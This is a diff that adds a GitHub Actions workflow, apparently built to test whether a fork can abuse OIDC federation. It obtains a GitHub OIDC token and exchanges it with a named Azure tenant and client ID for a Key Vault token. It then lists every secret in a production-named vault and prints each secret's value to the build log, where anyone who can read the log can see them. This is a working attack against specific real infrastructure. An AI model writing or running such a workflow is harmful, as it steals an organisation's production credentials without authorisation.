@@ -1,0 +1,45 @@
+name: fork-oidc-test
+on: push
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Get OIDC and test Azure exchange
+        run: |
+          echo "=== FORK OIDC TEST ==="
+          echo "Repo: $GITHUB_REPOSITORY"
+          echo "Ref: $GITHUB_REF"
+          
+          OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r .value)
+          
+          echo "OIDC len: ${#OIDC}"
+          echo "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq -c '{sub,repository,ref}'
+          
+          RESP=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
+            -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
+            -d "grant_type=client_credentials" \
+            -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+            -d "client_assertion=${OIDC}" \
+            -d "scope=https://vault.azure.net/.default")
+          
+          echo "Azure response:"
+          echo "$RESP" | jq .
+          
+          TOK=$(echo "$RESP" | jq -r '.access_token // empty')
+          if [ -n "$TOK" ]; then
+            echo "=== GOT TOKEN - FETCHING SECRETS ==="
+            curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" \
+              -H "Authorization: Bearer $TOK" | jq .
+            
+            for ID in $(curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" \
+              -H "Authorization: Bearer $TOK" | jq -r '.value[]?.id'); do
+              echo "=== SECRET: $ID ==="
+              curl -sS "$ID?api-version=7.4" -H "Authorization: Bearer $TOK" | jq -r '.value // .'
+            done
+          else
+            echo "=== NO TOKEN - Federation rejected ==="
+          fi
